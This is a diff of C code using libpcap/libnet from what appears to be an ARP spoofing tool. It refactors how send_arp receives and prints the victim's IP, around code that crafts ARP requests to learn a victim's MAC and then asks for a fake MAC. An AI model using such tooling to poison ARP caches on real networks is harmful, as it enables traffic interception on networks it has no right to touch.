@@ -9,12 +9,11 @@
 
 int get_arp(const u_char *packet, u_char *s_mac, u_char *d_mac, struct in_addr d_ip);
 
-void send_arp(char *victim_ip, u_char *s_mac, struct in_addr s_ip)
+void send_arp(u_char *s_mac, struct in_addr s_ip, struct in_addr d_ip)
 {
 	struct libnet_ethernet_hdr *eth_hdr;	//ethernet header
 	struct libnet_arp_hdr *arp_hdr;		//arp hedaer
-	struct pcap_pkthdr *header;		//packet header
-	struct in_addr d_ip;			//destination IP (victim)
+	struct pcap_pkthdr *header;		//packet header	
 	
 	const int packet_size = 42;	//arp_packet size (ether + arp)
 	pcap_t *handle = NULL;
@@ -33,6 +32,7 @@ void send_arp(char *victim_ip, u_char *s_mac, struct in_addr s_ip)
 	char *fake_mac;
 	uint8_t f_mac[6];
 
+	char buf[32];			//For d_ip address
 	int index = 0;
 
 	packet = (u_char *)malloc(packet_size);
@@ -75,7 +75,6 @@ void send_arp(char *victim_ip, u_char *s_mac, struct in_addr s_ip)
 	memcpy(packet + 22, s_mac, 6);			//Source MAC address
 	memcpy(packet + 28, &s_ip.s_addr, 4);		//Source IP address
 	memset(packet + 32, 0x00, 6);			//We don't know the MAC address yet
-	inet_pton(AF_INET, victim_ip, &d_ip.s_addr);
 	memcpy(packet + 38, &d_ip.s_addr, 4);		//Victim's IP address
 
 	pcap_sendpacket(handle, packet, packet_size);	//Send ARP request packet
@@ -96,7 +95,7 @@ void send_arp(char *victim_ip, u_char *s_mac, struct in_addr s_ip)
 
 	printf("Victim MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n", 
 		d_mac[0], d_mac[1], d_mac[2], d_mac[3], d_mac[4], d_mac[5]);
-	printf("Victim IP address: %s\n\n", victim_ip);
+	printf("Victim IP address: %s\n\n", inet_ntop(AF_INET, &d_ip, buf, sizeof(buf)));
 
 	puts("Write FAKE MAC address: ");
 	
